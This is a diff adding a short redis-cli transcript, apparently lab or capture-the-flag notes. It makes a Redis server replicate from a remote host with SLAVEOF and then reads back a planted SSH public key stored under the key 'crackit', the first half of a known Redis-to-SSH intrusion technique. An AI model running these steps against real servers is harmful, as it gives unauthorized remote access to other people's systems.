@@ -1,0 +1,8 @@
+# redis-cli
+127.0.0.1:6379> SLAVEOF 10.10.10.160 6379
+(wait for a moment)
+127.0.0.1:6379> KEYS *
+127.0.0.1:6379> get crackit
+"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD6mrgsUlv45bP+bRmSketYFzE+eRL1j9xSyebFPLDDBnqB91tcwyjyKuqc+giyp9UEqstn5V77tlMgMnlIw5mdCWbnXYnidUoHBtGrMCCME/XUkKk5TKP2zQxoxckFnQ598mYtPxoiSfADRcZKXPGlaJCRX
+24opefW75XTStD9Drbccc+RXtaxKLvAFczpBXxJYs/KyclwibYuTgVkRWr3cPFdhDiBALnGvOdcWX21/INa/dv1Or8gkA65U3f0zjvACV0bYc1Sh7WJVC7MN5bSSlgIo6yHIY9xaer5pmGnuqRxU7wDd5poC9XVZZM5weVwTmjKxK/ltOLI0CgUubRDWjlo2cdli5RMd
+MJ4a1NMP1ppWtHhxfJwVhO+5lWGNsEsPcOjRWw6URov1HTdzL8lGOuYZ4Uj3o+AKpZFlyxAImn0KtHcH7wmsfDWsPfHfqv5g+uYG8hJIEjNKGd2aXN+4wVvjp81JntoJjcbI8nQPcb0HzLLb08ZAY8fEZS43Hs= root@kali\n\n\n\n"
